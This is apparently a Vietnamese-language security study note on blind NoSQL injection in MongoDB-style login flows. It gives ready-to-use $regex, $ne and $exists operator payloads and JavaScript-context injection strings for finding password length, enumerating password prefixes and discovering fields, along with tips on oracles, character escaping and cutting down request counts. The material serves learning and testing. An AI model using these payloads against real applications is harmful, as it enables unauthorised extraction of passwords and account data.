# Blind Extraction Trong NoSQL

## Tong quan

`Blind extraction` duoc dung khi app khong in truc tiep data, nhung van co oracle de suy dien:

- success/fail
- redirect/no redirect
- content-length khac nhau
- status code khac nhau
- delay co dieu kien

Trong Mongo-style app, blind extraction thuong dua vao `$regex` hon la `UNION` nhu SQLi.

## Y tuong cot loi

Bien bai toan "doc data" thanh chuoi cau hoi true/false.

Vi du:

- password co do dai 8 khong?
- password co bat dau bang `ad` khong?
- field `password` co ton tai khong?

## Flow thuong gap

```js
db.users.findOne({
  username: "admin",
  password: attackerControlled
});
```

Neu `password` chap nhan operator object, attacker co the dat:

```json
{"username":{"$eq":"admin"},"password":{"$regex":"^a"}}
```

## Tim do dai truoc

Form-urlencoded:

```text
username[$ne]=x&password[$regex]=.{1}
username[$ne]=x&password[$regex]=.{3}
```

JSON:

```json
{"username":{"$eq":"admin"},"password":{"$regex":"^.{8}$"}}
```

Tim do dai truoc giup giam request vo ich.

## Prefix enumeration

Form-urlencoded:

```text
username[$ne]=x&password[$regex]=a.*
username[$ne]=x&password[$regex]=ad.*
username[$ne]=x&password[$regex]=adm.*
```

JSON:

```json
{"username":{"$eq":"admin"},"password":{"$regex":"^a"}}
{"username":{"$eq":"admin"},"password":{"$regex":"^ad"}}
```

## Field discovery truoc khi extract

Neu co syntax/JS context:

```text
admin' && this.password!='
admin' && this.email!='
admin' && this.foo!='
```

Neu chi co operator context:

```json
{"password":{"$exists":true}}
```

## Oracle can theo doi

| Oracle | Vi du |
|--------|------|
| Redirect | true -> `302 /dashboard` |
| Message | "Welcome" vs "Invalid" |
| Status | `200` vs `401` |
| Length | response size thay doi |
| DOM marker | element chi xuat hien khi true |

## Van de escaping

Regex extraction can xu ly:

- ky tu metachar (`*`, `+`, `.`, `?`, `|`, `(`, `)`, `[`, `]`)
- URL encoding
- filter bo mot so ky tu

Cach lam thuc dung:

1. bat dau voi charset hep (a-z,0-9)
2. mo rong dan neu khong match
3. escape ky tu regex truoc khi gui

## Toi uu

| Ky thuat | Loi ich |
|---------|---------|
| target username co san | tranh match nham account |
| tim length truoc | giam so request |
| cache prefix dung | tranh brute-force lap |
| giu session on dinh | giam nhieu do CSRF/auth state |

## Khi blind extraction khong hieu qua

Co the that bai neu:

- app normalize tat ca loi thanh cung 1 response
- regex bi chan
- co rate limit/lockout nghiem
- auth check khong dua vao selector (hash verify o app layer)

Khi do, can thu timing-based qua JS injection context.
